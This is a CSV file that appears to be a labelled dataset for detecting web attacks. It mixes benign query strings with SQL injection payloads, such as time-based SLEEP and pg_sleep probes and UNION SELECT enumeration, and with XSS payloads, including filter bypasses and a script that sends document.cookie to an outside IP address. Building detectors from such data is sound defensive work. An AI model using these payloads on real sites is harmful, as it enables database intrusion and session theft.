payload,label
')) or sleep(5)=',sqli
page=8997&city=foxtrot,benign
sort=desc&name=budget&category=profile,benign
limit=8500&name=budget,benign
session=d4f7b6&view=grid&callback=surakarta,benign
token=1d0b159&lang=en,benign
currency=usd&lang=id&user_id=2737,benign
redirect=/home&lang=en&q=jakarta,benign
ORDER BY 26--,sqli
<svg><style> <script>alert(1)</script> </style></svg>,xss
color=budget,benign
user_id=2236&lang=en,benign
price_min=1084&color=shoes,benign
confirm(document.domain),xss
price_min=5254&price_max=2348,benign
ref=profile&email=report@example.com&q=book,benign
limit=7542&category=budget,benign
view=grid&format=json,benign
page=7092&city=jakarta&coupon=phone,benign
ORDER BY 5#,sqli
' GROUP BY columnnames having 1=1 --,sqli
<script>alert(123);</script>,xss
ORDER BY 10--,sqli
theme=dark&format=json,benign
redirect=/home&email=budget@example.com&token=28c052c,benign
<iframe src=javascript:alert('test')>,xss
size=m&q=foxtrot,benign
page=9373&price_min=3644&format=json,benign
email=orders@example.com,benign
price_min=3626,benign
qty=5543,benign
OR 1=0#,sqli
1' ORDER BY 1--+,sqli
email=orders@example.com&coupon=laptop&category=echo,benign
token=1fc8533&search=camera,benign
city=jakarta,benign
page=3840&ref=phone&token=534763c,benign
//,sqli
limit=4353&color=jakarta&q=echo,benign
page=9823,benign
coupon=echo&token=59073ac,benign
<math><style> <img src onerror=alert(2)> </style></math>,xss
user_id=3451&price_max=4326,benign
coupon=book&email=camera@example.com&sort=asc,benign
`,sqli
"and (select substring(@@version,3,1))='S'",sqli
OR 3409=3409 AND ('pytW' LIKE 'pytW,sqli
AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND '%'=',sqli
limit=2718&theme=dark&qty=9280,benign
token=1d35f56&format=json,benign
redirect=/home&search=foxtrot&name=invoice,benign
OR x=y,sqli
offset=7260&category=echo&price_max=9886,benign
redirect=/home&qty=4409&category=laptop,benign
alert(123),xss
token=54b75fe&lang=id,benign
"' UNION SELECT NULL,NULL,NULL,NULL,NULL--",sqli
qty=4067&user_id=6819&sort=asc,benign
"OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))",sqli
email=settings@example.com&id=6866,benign
search=dashboard&city=report&lang=en,benign
search=dashboard&redirect=/home,benign
"<pre id=p style=background:#000><svg onload='setInterval(n=>{for(o=t++,i=476;i--;o+=i%30?(""0o""[c=0|(h=v=>(M=Math).hypot(i/30-8+3*M.sin(t/8/v),i%30/2-7+4*M.cos(t/9/v)))(7)*h(9)*h(6)/32]||""."").fontcolor(c>2):""\n"");p.innerHTML=o},t=1)'>",xss
<<SCRIPT>alert(document.cookie);//\<</SCRIPT>>,xss
session=3aa6d07&price_max=6932,benign
name=jakarta,benign
email=phone@example.com&qty=1525,benign
callback=profile,benign
"poc.svg = <svg xmlns=""http://www.w3.org/2000/svg"" onload=""alert(document.domain)""/>",xss
' UNION SELECT NULL--,sqli
'',sqli
ORDER BY 25#,sqli
page=158&theme=dark&lang=id,benign
OR 1=1,sqli
redirect=/home&limit=7420&offset=6763,benign
ref=phone&limit=8614,benign
ORDER BY 9#,sqli
price_max=3181&user_id=5913&sort=desc,benign
page=6245&lang=id,benign
format=json&lang=en,benign
id=6780&user_id=9168,benign
token=1f03855,benign
RANDOMBLOB(500000000/2),sqli
1) or pg_sleep(5)--,sqli
callback=alice,benign
AND 1=0--,sqli
"""><script>alert(document.domain + '\n' + ""1"")</script>",xss
'''''''''''''UNION SELECT '2,sqli
<sc<script>ript>alert(1)</sc</script>ript>,xss
offset=7020&callback=budget&price_min=8349,benign
ORDER BY 18#,sqli
page=8857,benign
or SLEEP(5),sqli
confirm(document.cookie),xss
limit=7556,benign
color=shoes&search=profile,benign
"<script>var i=new Image; i.src=""http://192.168.1.6/?""+document.cookie;</script>",xss
sort=asc&city=settings,benign
city=foxtrot&format=json&lang=en,benign
limit=2617&qty=5124,benign
view=grid&email=orders@example.com&sort=asc,benign
id=4315&format=json&view=grid,benign
price_max=3258&id=3612&city=laptop,benign
""" or benchmark(10000000,MD5(1))#",sqli
theme=dark&redirect=/home,benign
category=invoice&name=invoice&offset=2585,benign
pg_SLEEP(5)--,sqli
';alert(test); //,xss
/*…*/,sqli
format=json&coupon=book,benign
</script><svg onload=alert(document.cookie)>,xss
"OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))",sqli
price_min=437&user_id=4351,benign
alert(document.domain),xss
coupon=settings,benign
"\""-alert(1)}//",xss
<body onmessage=print()>,xss
currency=usd&city=report,benign
sleep(5)#,sqli
limit=9425,benign
